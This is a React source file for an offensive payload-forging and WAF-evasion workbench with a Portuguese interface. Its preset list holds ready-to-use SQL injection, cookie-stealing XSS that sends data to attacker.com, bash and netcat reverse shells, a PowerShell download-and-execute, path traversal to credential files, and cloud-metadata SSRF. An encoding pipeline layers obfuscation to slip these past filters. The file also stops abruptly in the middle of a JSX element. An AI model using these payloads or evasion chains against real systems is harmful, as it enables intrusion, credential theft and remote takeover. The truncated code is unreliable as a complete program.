import React, { useState, useMemo, useEffect, useCallback } from 'react';
import { 
  Binary, 
  Copy, 
  Check, 
  RotateCcw, 
  ArrowRightLeft, 
  Sparkles, 
  Code,
  FileText,
  Layers,
  Search,
  ShieldAlert,
  Terminal,
  Activity,
  Zap,
  ArrowRight,
  Filter,
  CheckCircle2,
  AlertTriangle,
  Flame,
  Globe,
  Plus,
  Trash2,
  Lock,
  Eye,
  KeyRound,
  Send,
  RefreshCw,
  ExternalLink,
  ShieldCheck,
  Cpu
} from 'lucide-react';
import { 
  computeAllEncodings, 
  decodePayload, 
  calculateShannonEntropy, 
  detectPayloadEncoding, 
  recursiveDeobfuscate, 
  SAMPLE_ENCODER_PAYLOADS,
  SampleAttackPayload,
  DeobfuscationStep,
  DetectedEncodingInfo,
  EncodedVariants
} from '../utils/encoderMultiTool';

export type ToolViewMode = 'LIVE_WORKBENCH' | 'ENCODER_MATRIX' | 'DEOBFUSCATOR' | 'PIPELINE_CRAFTER' | 'RECIPES';
export type WorkbenchSubMode = 'ENCODE' | 'DECODE' | 'FOUR_WAY_SYNC';
export type DecoderFormat = 'url' | 'base64' | 'hex' | 'html' | 'unicode' | 'rot13';
export type PipelineOp = 
  | 'url_encode' 
  | 'double_url' 
  | 'full_url' 
  | 'base64_std' 
  | 'base64_url' 
  | 'hex_slash' 
  | 'hex_sql' 
  | 'case_alt' 
  | 'sql_comment' 
  | 'rot13';

export interface PayloadEncoderDecoderProps {
  initialPayload?: string;
  onSendToPocBuilder?: (url: string, payload: string) => void;
  onSendToFuzzer?: (payload: string) => void;
  onSendToOobCollaborator?: (payload: string) => void;
}

// Attack categories for quick presets
interface AttackPresetCategory {
  category: string;
  label: string;
  icon: string;
  items: Array<{ name: string; payload: string; tag: string }>;
}

const ATTACK_CRAFT_PRESETS: AttackPresetCategory[] = [
  {
    category: 'SQLi',
    label: 'SQL Injection',
    icon: '💉',
    items: [
      { name: 'UNION Version & User', payload: "1' UNION SELECT @@version, user(), database()-- -", tag: 'UNION' },
      { name: 'Auth Bypass Boolean', payload: "admin' OR '1'='1'-- -", tag: 'Auth' },
      { name: 'Time-Based Sleep (MySQL)', payload: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -", tag: 'Blind' },
      { name: 'Error-Based XML (MSSQL)', payload: "'; DECLARE @x xml='<a b=\"'||(SELECT @@version)||'\"/>';--", tag: 'MSSQL' }
    ]
  },
  {
    category: 'XSS',
    label: 'Cross-Site Scripting',
    icon: '⚡',
    items: [
      { name: 'Script Cookie Alert', payload: '<script>alert(document.cookie)</script>', tag: 'Classic' },
      { name: 'SVG Onload Fetch Exfil', payload: '<svg/onload=fetch("//attacker.com/log?"+document.cookie)>', tag: 'Bypass' },
      { name: 'Img Error Alert(1)', payload: '"><img src=x onerror=alert(document.domain)>', tag: 'Attribute' },
      { name: 'Template Literal Eval', payload: '${alert`XSS`}', tag: 'ES6' }
    ]
  },
  {
    category: 'RCE',
    label: 'Command Execution & Shells',
    icon: '💻',
    items: [
      { name: 'Bash TCP Reverse Shell', payload: 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1', tag: 'Linux' },
      { name: 'NC Reverse Shell', payload: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f', tag: 'Netcat' },
      { name: 'Python3 TTY Shell', payload: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", tag: 'Spawn' },
      { name: 'PowerShell Download Exec', payload: 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.5/shell.ps1\')"', tag: 'Windows' }
    ]
  },
  {
    category: 'LFI',
    label: 'Path Traversal & LFI',
    icon: '📁',
    items: [
      { name: 'Linux /etc/passwd Deep', payload: '../../../../../../../../etc/passwd', tag: 'Linux' },
      { name: 'PHP Base64 Filter', payload: 'php://filter/convert.base64-encode/resource=config.php', tag: 'Wrapper' },
      { name: 'Linux Environ Esc', payload: '../../../../../../proc/self/environ', tag: 'Proc' },
      { name: 'Windows win.ini', payload: '..\\..\\..\\..\\windows\\win.ini', tag: 'Windows' }
    ]
  },
  {
    category: 'SSRF',
    label: 'Cloud Metadata SSRF',
    icon: '☁️',
    items: [
      { name: 'AWS IMDSv1 Credentials', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', tag: 'AWS' },
      { name: 'GCP Metadata Token', payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', tag: 'GCP' },
      { name: 'Azure Instance Metadata', payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', tag: 'Azure' }
    ]
  }
];

export const PayloadEncoderDecoder: React.FC<PayloadEncoderDecoderProps> = ({
  initialPayload,
  onSendToPocBuilder,
  onSendToFuzzer,
  onSendToOobCollaborator
}) => {
  const [viewMode, setViewMode] = useState<ToolViewMode>('LIVE_WORKBENCH');
  const [workbenchSubMode, setWorkbenchSubMode] = useState<WorkbenchSubMode>('ENCODE');

  // Matrix Encoder / Live Input State
  const [inputText, setInputText] = useState<string>(() => {
    return initialPayload || SAMPLE_ENCODER_PAYLOADS[0].payload;
  });

  // Decode Mode Input State
  const [decodeInput, setDecodeInput] = useState<string>(
    '%3C%73%76%67%20%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3E'
  );

  // 4-Way Sync Mode Independent State
  const [syncPlain, setSyncPlain] = useState<string>("admin' OR 1=1--");
  const [syncB64, setSyncB64] = useState<string>('');
  const [syncUrl, setSyncUrl] = useState<string>('');
  const [syncHex, setSyncHex] = useState<string>('');

  // Selected sub-variant tabs inside Live Panels
  const [activeB64Variant, setActiveB64Variant] = useState<'std' | 'url' | 'eval' | 'bash' | 'uri' | 'ps'>('std');
  const [activeUrlVariant, setActiveUrlVariant] = useState<'std' | 'double' | 'triple' | 'full' | 'path'>('std');
  const [activeHexVariant, setActiveHexVariant] = useState<'slash' | 'sql' | 'char' | 'space' | 'raw'>('slash');

  // Deobfuscator manual format
  const [manualDecodeFormat, setManualDecodeFormat] = useState<DecoderFormat>('url');

  // Pipeline Crafter state
  const [pipelineInput, setPipelineInput] = useState<string>("1' UNION SELECT username, password FROM users--");
  const [pipelineOps, setPipelineOps] = useState<PipelineOp[]>(['sql_comment', 'base64_std', 'url_encode']);

  // Presets search
  const [presetSearch, setPresetSearch] = useState<string>('');
  const [selectedCategory, setSelectedCategory] = useState<string>('ALL');

  // Feedback notifications
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = useCallback((msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 2500);
  }, []);

  const handleCopy = useCallback((key: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    showToast('Copiado para a área de transferência!');
    setTimeout(() => setCopiedKey(null), 2000);
  }, [showToast]);

  // Real-time calculations for Matrix / Encode
  const encodings: EncodedVariants = useMemo(() => {
    return computeAllEncodings(inputText);
  }, [inputText]);

  const inputEntropy = useMemo(() => {
    return calculateShannonEntropy(inputText);
  }, [inputText]);

  const inputByteLength = useMemo(() => {
    return new TextEncoder().encode(inputText).length;
  }, [inputText]);

  // Real-time calculations for Decode Mode
  const detectedDecodeFormats: DetectedEncodingInfo[] = useMemo(() => {
    return detectPayloadEncoding(decodeInput);
  }, [decodeInput]);

  const decodeEntropy = useMemo(() => {
    return calculateShannonEntropy(decodeInput);
  }, [decodeInput]);

  // Automatic best-effort decode to plain
  const autoDecodedPlain = useMemo(() => {
    if (!decodeInput.trim()) return '';
    const detections = detectPayloadEncoding(decodeInput);
    const primaryFormat = detections[0]?.format || 'url';
    if (primaryFormat === 'plain') return decodeInput;
    return decodePayload(decodeInput, primaryFormat);
  }, [decodeInput]);

  // Decoded variants derived from the auto-decoded plain text
  const derivedEncodingsFromDecode = useMemo<EncodedVariants>(() => {
    return computeAllEncodings(autoDecodedPlain || decodeInput);
  }, [autoDecodedPlain, decodeInput]);

  // Deobfuscator manual result
  const manualDecodedResult = useMemo(() => {
    return decodePayload(decodeInput, manualDecodeFormat);
  }, [decodeInput, manualDecodeFormat]);

  // Recursive Layer Peeler steps
  const recursiveSteps: DeobfuscationStep[] = useMemo(() => {
    if (!decodeInput.trim()) return [];
    return recursiveDeobfuscate(decodeInput, 6);
  }, [decodeInput]);

  // 4-Way Sync Bidirectional Engine
  const updateSyncFromPlain = useCallback((val: string) => {
    setSyncPlain(val);
    try {
      const utf8Bytes = encodeURIComponent(val).replace(/%([0-9A-F]{2})/g, (_, p1) =>
        String.fromCharCode(parseInt(p1, 16))
      );
      setSyncB64(btoa(utf8Bytes));
    } catch {
      setSyncB64('');
    }
    setSyncUrl(encodeURIComponent(val));
    setSyncHex(val.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
  }, []);

  const updateSyncFromB64 = useCallback((val: string) => {
    setSyncB64(val);
    try {
      const plain = decodePayload(val, 'base64');
      setSyncPlain(plain);
      setSyncUrl(encodeURIComponent(plain));
      setSyncHex(plain.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
    } catch {
      // ignore
    }
  }, []);

  const updateSyncFromUrl = useCallback((val: string) => {
    setSyncUrl(val);
    try {
      const plain = decodeURIComponent(val);
      setSyncPlain(plain);
      try {
        const utf8Bytes = encodeURIComponent(plain).replace(/%([0-9A-F]{2})/g, (_, p1) =>
          String.fromCharCode(parseInt(p1, 16))
        );
        setSyncB64(btoa(utf8Bytes));
      } catch {
        setSyncB64('');
      }
      setSyncHex(plain.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
    } catch {
      // ignore
    }
  }, []);

  const updateSyncFromHex = useCallback((val: string) => {
    setSyncHex(val);
    try {
      const plain = decodePayload(val, 'hex');
      if (!plain.startsWith('[Erro')) {
        setSyncPlain(plain);
        setSyncUrl(encodeURIComponent(plain));
        try {
          const utf8Bytes = encodeURIComponent(plain).replace(/%([0-9A-F]{2})/g, (_, p1) =>
            String.fromCharCode(parseInt(p1, 16))
          );
          setSyncB64(btoa(utf8Bytes));
        } catch {
          setSyncB64('');
        }
      }
    } catch {
      // ignore
    }
  }, []);

  // Initialize 4-way sync on first mount
  useEffect(() => {
    updateSyncFromPlain(syncPlain);
  }, []);

  // Pipeline execution
  const pipelineStages = useMemo(() => {
    const stages: Array<{ op: PipelineOp; label: string; result: string; entropy: number }> = [];
    let current = pipelineInput;

    for (const op of pipelineOps) {
      let next = current;
      let label = '';
      if (op === 'url_encode') {
        next = encodeURIComponent(current);
        label = 'URL Encode (%20)';
      } else if (op === 'double_url') {
        next = encodeURIComponent(encodeURIComponent(current));
        label = 'Double URL Encode (%2520)';
      } else if (op === 'full_url') {
        next = current.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()).join('');
        label = 'Full URL Encode (%XX All Chars)';
      } else if (op === 'base64_std') {
        try {
          const utf8Bytes = encodeURIComponent(current).replace(/%([0-9A-F]{2})/g, (_, p1) =>
            String.fromCharCode(parseInt(p1, 16))
          );
          next = btoa(utf8Bytes);
        } catch {
          next = current;
        }
        label = 'Base64 Standard';
      } else if (op === 'base64_url') {
        try {
          const utf8Bytes = encodeURIComponent(current).replace(/%([0-9A-F]{2})/g, (_, p1) =>
            String.fromCharCode(parseInt(p1, 16))
          );
          next = btoa(utf8Bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        } catch {
          next = current;
        }
        label = 'Base64URL Safe';
      } else if (op === 'hex_slash') {
        next = current.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        label = 'Hex Escaped (\\x..)';
      } else if (op === 'hex_sql') {
        next = '0x' + current.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        label = 'SQL Hex Literal (0x..)';
      } else if (op === 'case_alt') {
        next = current.split('').map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase())).join('');
        label = 'Alternating Case (sElEcT)';
      } else if (op === 'sql_comment') {
        next = current.replace(/\s+/g, '/**/');
        label = 'SQL Comment Spaces (/**/)';
      } else if (op === 'rot13') {
        next = current.replace(/[a-zA-Z]/g, c => {
          const base = c <= 'Z' ? 65 : 97;
          return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
        });
        label = 'ROT13 Substitution';
      }

      stages.push({
        op,
        label,
        result: next,
        entropy: calculateShannonEntropy(next)
      });
      current = next;
    }

    return stages;
  }, [pipelineInput, pipelineOps]);

  // Filtered presets
  const filteredPresets = useMemo(() => {
    return SAMPLE_ENCODER_PAYLOADS.filter(p => {
      const matchCat = selectedCategory === 'ALL' || p.category === selectedCategory;
      const matchSearch = 
        p.name.toLowerCase().includes(presetSearch.toLowerCase()) ||
        p.description.toLowerCase().includes(presetSearch.toLowerCase()) ||
        p.payload.toLowerCase().includes(presetSearch.toLowerCase()) ||
        p.wafTarget.toLowerCase().includes(presetSearch.toLowerCase());
      return matchCat && matchSearch;
    });
  }, [presetSearch, selectedCategory]);

  const getEntropyBadge = (entropy: number) => {
    if (entropy < 3.2) {
      return {
        label: 'Baixa (Legível / Plaintext)',
        color: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30',
        barColor: 'bg-emerald-500'
      };
    }
    if (entropy <= 4.6) {
      return {
        label: 'Média (Ofuscado / Hex / URL)',
        color: 'bg-amber-500/15 text-amber-400 border-amber-500/30',
        barColor: 'bg-amber-500'
      };
    }
    return {
      label: 'Alta (Empacotado / Base64 / Cripto)',
      color: 'bg-rose-500/15 text-rose-400 border-rose-500/30',
      barColor: 'bg-rose-500'
    };
  };

  const currentEntropyInfo = getEntropyBadge(inputEntropy);

  // Helper to get active B64 string
  const currentB64String = useMemo(() => {
    switch (activeB64Variant) {
      case 'url': return encodings.base64Url;
      case 'eval': return encodings.base64EvalJs;
      case 'bash': return encodings.base64Bash;
      case 'uri': return encodings.base64DataUri;
      case 'ps': return encodings.powershellBase64;
      default: return encodings.base64;
    }
  }, [activeB64Variant, encodings]);

  // Helper to get active URL string
  const currentUrlString = useMemo(() => {
    switch (activeUrlVariant) {
      case 'double': return encodings.doubleUrlEncode;
      case 'triple': return encodings.tripleUrlEncode;
      case 'full': return encodings.fullUrlEncode;
      case 'path': return encodings.urlPathTraversal;
      default: return encodings.urlEncode;
    }
  }, [activeUrlVariant, encodings]);

  // Helper to get active Hex string
  const currentHexString = useMemo(() => {
    switch (activeHexVariant) {
      case 'sql': return encodings.hexSqlLiteral;
      case 'char': return encodings.sqlChar;
      case 'space': return encodings.hexSpace;
      case 'raw': return encodings.hexRaw;
      default: return encodings.hexSlashX;
    }
  }, [activeHexVariant, encodings]);

  return (
    <div className="space-y-6">
      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50 bg-cyan-600 text-white font-mono text-xs px-4 py-2.5 rounded-xl shadow-2xl border border-cyan-400 flex items-center gap-2 animate-in fade-in slide-in-from-bottom-3 duration-200">
          <CheckCircle2 className="w-4 h-4 text-cyan-200" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Top Banner Header */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 sm:p-6 shadow-xl relative overflow-hidden">
        <div className="absolute -right-8 -top-8 w-60 h-60 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-5">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="px-2.5 py-0.5 rounded-md bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Binary className="w-3.5 h-3.5" />
                <span>Real-Time Base64, URL & Hex Engine</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-emerald-400 font-mono text-xs font-bold">
                Codificação & Decodificação Bidirecional
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">
                Análise de Entropia & WAF Evasion
              </span>
            </div>
            <h2 className="text-xl sm:text-2xl font-bold tracking-tight text-white flex items-center gap-2.5">
              <span>Canivete Suíço de Codificação & Evasão de WAF</span>
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Forje, analise e desofusque payloads de ataque em tempo real. Alterne entre conversão simultânea para <strong className="text-zinc-200">Base64 (RFC 4648, URL-safe, inline eval JS, Bash pipe)</strong>, <strong className="text-zinc-200">URL Encoding (Standard, Double, Triple, Full %XX, Traversal)</strong> e <strong className="text-zinc-200">Hexadecimal (\x.., 0x.., SQL literal, continuous)</strong> com medidor de entropia Shannon e desempacotador recursivo de camadas.
            </p>
          </div>

          {/* Quick Metrics Badge */}
          <div className="flex items-center gap-3 shrink-0 bg-[#161622] border border-[#262638] rounded-xl p-3">
            <div className="space-y-1">
              <div className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider flex items-center gap-1">
                <Activity className="w-3 h-3 text-cyan-400" />
                <span>Entropia Shannon</span>
              </div>
              <div className="text-lg font-black font-mono text-white flex items-baseline gap-1.5">
                <span>{inputEntropy}</span>
                <span className="text-[11px] text-zinc-500 font-normal">bits/byte</span>
              </div>
              <div className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border inline-block ${currentEntropyInfo.color}`}>
                {currentEntropyInfo.label}
              </div>
            </div>
            <div className="border-l border-[#262638] pl-3 space-y-1 text-right">
              <div className="text-[10px] font-mono text-zinc-400">Tamanho</div>
              <div className="text-xs font-mono font-bold text-cyan-300">{inputText.length} chars</div>
              <div className="text-[10px] font-mono text-zinc-500">{inputByteLength} bytes UTF-8</div>
            </div>
          </div>
        </div>

        {/* View Mode Navigation Pills */}
        <div className="flex items-center gap-2 overflow-x-auto pt-5 mt-5 border-t border-[#1e1e28] scrollbar-none">
          <button
            type="button"
            onClick={() => setViewMode('LIVE_WORKBENCH')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              viewMode === 'LIVE_WORKBENCH'
                ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Zap className="w-3.5 h-3.5" />
            <span>Workbench em Tempo Real (Base64 • URL • Hex)</span>
          </button>

          <button
            type="button"
            onClick={() => setViewMode('ENCODER_MATRIX')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              viewMode === 'ENCODER_MATRIX'
                ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            <span>Matriz de Todas as Variantes (20+)</span>
          </button>

          <button
            type="button"
            onClick={() => setViewMode('DEOBFUSCATOR')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              viewMode === 'DEOBFUSCATOR'
                ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Eye className="w-3.5 h-3.5" />
            <span>Desofuscador & Desempacotador Recursivo</span>
          </button>

          <button
            type="button"
            onClick={() => setViewMode('PIPELINE_CRAFTER')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              viewMode === 'PIPELINE_CRAFTER'
                ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Cpu className="w-3.5 h-3.5" />
            <span>Pipeline Sequencial de Evasão</span>
          </button>

          <button
            type="button"
            onClick={() => setViewMode('RECIPES')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              viewMode === 'RECIPES'
                ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Flame className="w-3.5 h-3.5" />
            <span>Catálogo de Payloads & Receitas WAF</span>
          </button>
        </div>
      </div>

      {/* ========================================================================= */}
      {/* MODE 1: LIVE WORKBENCH (PRIMARY REAL-TIME INTERACTION) */}
      {/* ========================================================================= */}
      {viewMode === 'LIVE_WORKBENCH' && (
        <div className="space-y-6">
          {/* Sub-Mode Control Bar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#121218] border border-[#22222d] rounded-2xl p-4">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs font-mono font-bold text-zinc-400 uppercase tracking-wider mr-1">
                Modo de Operação:
              </span>
              <button
                type="button"
                onClick={() => setWorkbenchSubMode('ENCODE')}
                className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
                  workbenchSubMode === 'ENCODE'
                    ? 'bg-cyan-500 text-black shadow-md'
                    : 'bg-[#181824] text-zinc-400 hover:text-white border border-[#262638]'
                }`}
              >
                <Zap className="w-3.5 h-3.5" />
                <span>1. Codificar Payload (Plaintext ➔ B64/URL/Hex)</span>
              </button>

              <button
                type="button"
                onClick={() => setWorkbenchSubMode('DECODE')}
                className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
                  workbenchSubMode === 'DECODE'
                    ? 'bg-cyan-500 text-black shadow-md'
                    : 'bg-[#181824] text-zinc-400 hover:text-white border border-[#262638]'
                }`}
              >
                <Eye className="w-3.5 h-3.5" />
                <span>2. Decodificar & Analisar (Ofuscado ➔ Plaintext)</span>
              </button>

              <button
                type="button"
                onClick={() => setWorkbenchSubMode('FOUR_WAY_SYNC')}
                className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
                  workbenchSubMode === 'FOUR_WAY_SYNC'
                    ? 'bg-cyan-500 text-black shadow-md'
                    : 'bg-[#181824] text-zinc-400 hover:text-white border border-[#262638]'
                }`}
              >
                <ArrowRightLeft className="w-3.5 h-3.5" />
                <span>3. Sincronização 4-Way (Live Multi-Box)</span>
              </button>
            </div>

            {/* Quick action buttons to integration tools */}
            <div className="flex items-center gap-2">
              {onSendToPocBuilder && (
                <button
                  type="button"
                  onClick={() => onSendToPocBuilder('', inputText)}
                  className="px-2.5 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/30 text-amber-300 font-mono text-xs font-bold flex items-center gap-1 transition-all cursor-pointer"
                  title="Enviar payload ativo para o PoC Request Builder"
                >
                  <Send className="w-3 h-3 text-amber-400" />
                  <span>PoC Builder</span>
                </button>
              )}
              {onSendToFuzzer && (
                <button
                  type="button"
                  onClick={() => onSendToFuzzer(inputText)}
                  className="px-2.5 py-1.5 rounded-xl bg-indigo-500/15 hover:bg-indigo-500/25 border border-indigo-500/30 text-indigo-300 font-mono text-xs font-bold flex items-center gap-1 transition-all cursor-pointer"
                  title="Enviar para o Payload Fuzzer"
                >
                  <Terminal className="w-3 h-3 text-indigo-400" />
                  <span>Fuzzer</span>
                </button>
              )}
            </div>
          </div>

          {/* SUB-MODE 1: ENCODE PAYLOAD */}
          {workbenchSubMode === 'ENCODE' && (
            <div className="space-y-6">
              {/* Plaintext / Attack Payload Input Card */}
              <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-cyan-400" />
                    <h3 className="text-sm font-bold text-white">
                      Payload de Ataque / Texto em Claro (Entrada Primária)
                    </h3>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        setDecodeInput(currentB64String);
                        setWorkbenchSubMode('DECODE');
                        showToast('Payload Base64 enviado para análise no Decodificador!');
                      }}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-cyan-300 text-xs font-mono border border-cyan-500/30 flex items-center gap-1 transition-colors cursor-pointer"
                      title="Copiar resultado codificado e testar decodificação reversa"
                    >
                      <ArrowRightLeft className="w-3 h-3" />
                      <span>Testar Decodificação Reversa</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleCopy('encode-input', inputText)}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-300 text-xs font-mono border border-[#262638] flex items-center gap-1 cursor-pointer"
                    >
                      {copiedKey === 'encode-input' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setInputText('')}
                      className="px-2.5 py-1 rounded-lg bg-[#181824] hover:bg-[#222234] text-zinc-400 hover:text-white text-xs font-mono transition-colors cursor-pointer"
                    >
                      Limpar
                    </button>
                  </div>
                </div>

                {/* Input Textarea */}
                <textarea
                  rows={3}
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  placeholder="Insira o payload de ataque (ex: 1' UNION SELECT @@version-- ou <script>alert(1)</script> ou bash -i >&...)"
                  className="w-full bg-[#0c0c10] border border-[#232330] rounded-xl px-3.5 py-2.5 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-400 leading-relaxed"
                />

                {/* Shannon Entropy Visual Progress Bar */}
                <div className="space-y-1.5 pt-1">
                  <div className="flex items-center justify-between text-[11px] font-mono">
                    <span className="text-zinc-400 flex items-center gap-1.5">
                      <Activity className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Entropia Shannon da Entrada:</span>
                      <strong className="text-white">{inputEntropy} / 8.000 bits</strong>
                    </span>
                    <span className="text-zinc-500">
                      {inputText.length} caracteres ({inputByteLength} bytes)
                    </span>
                  </div>
                  <div className="w-full h-1.5 bg-[#171722] rounded-full overflow-hidden border border-[#242436]">
                    <div 
                      className={`h-full ${currentEntropyInfo.barColor} transition-all duration-300`}
                      style={{ width: `${Math.min(100, (inputEntropy / 8.0) * 100)}%` }}
                    />
                  </div>
                </div>

                {/* Quick Categorized Attack Presets Bar */}
                <div className="pt-2 border-t border-[#1e1e28] space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-[11px] font-mono font-bold text-zinc-400 uppercase tracking-wider flex items-center gap-1.5">
                      <Sparkles className="w-3.5 h-3.5 text-amber-400" />
                      <span>Presets Rápidos para Forja de Payloads:</span>
                    </span>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2">
                    {ATTACK_CRAFT_PRESETS.map(cat => (
                      <div key={cat.category} className="bg-[#161622] border border-[#242436] rounded-xl p-2.5 space-y-1.5">
                        <div className="text-[11px] font-mono font-bold text-white flex items-center gap-1">
                          <span>{cat.icon}</span>
                          <span>{cat.label}</span>
                        </div>
                        <div className="space-y-1">
                          {cat.items.map(item => (
                            <button
                              key={item.name}
                              type="button"
                              onClick={() => {
                                setInputText(item.payload);
                                showToast(`Payload ${item.name} carregado!`);
                              }}
                              className="w-full text-left px-2 py-1 rounded bg-[#101018] hover:bg-[#1c1c2a] text-zinc-300 hover:text-white text-[10px] font-mono transition-colors truncate flex items-center justify-between border border-[#1f1f2e] cursor-pointer"
                              title={item.payload}
                            >
                              <span className="truncate">{item.name}</span>
                              <span className="text-[8px] px-1 py-0.2 rounded bg-zinc-800 text-zinc-400 shrink-0 ml-1">
                                {item.tag}
                              </span>
                            </button>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Real-time Triple-Engine Output Panels (Base64, URL, Hex) */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* 1. BASE64 ENGINE PANEL */}
                <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg flex flex-col justify-between">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2.5">
                      <div className="flex items-center gap-2">
                        <span className="w-2.5 h-2.5 rounded-full bg-purple-500 animate-pulse" />
                        <h4 className="text-sm font-bold text-white font-mono">1. Base64 Engine</h4>
                      </div>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30">
                        RFC 4648
                      </span>
                    </div>

                    {/* Variant Tabs */}
                    <div className="flex items-center gap-1 overflow-x-auto pb-1 scrollbar-none text-[11px] font-mono">
                      {[
                        { id: 'std', label: 'Standard' },
                        { id: 'url', label: 'URL-Safe (-_)' },
                        { id: 'eval', label: 'eval(atob())' },
                        { id: 'bash', label: 'Bash Pipe' },
                        { id: 'uri', label: 'Data URI' },
                        { id: 'ps', label: 'PowerShell' }
                      ].map(tab => (
                        <button
                          key={tab.id}
                          type="button"
                          onClick={() => setActiveB64Variant(tab.id as any)}
                          className={`px-2 py-1 rounded-lg transition-all cursor-pointer whitespace-nowrap ${
                            activeB64Variant === tab.id
                              ? 'bg-purple-500/20 text-purple-200 border border-purple-400 font-bold'
                              : 'bg-[#171722] text-zinc-400 hover:text-white border border-[#232332]'
                          }`}
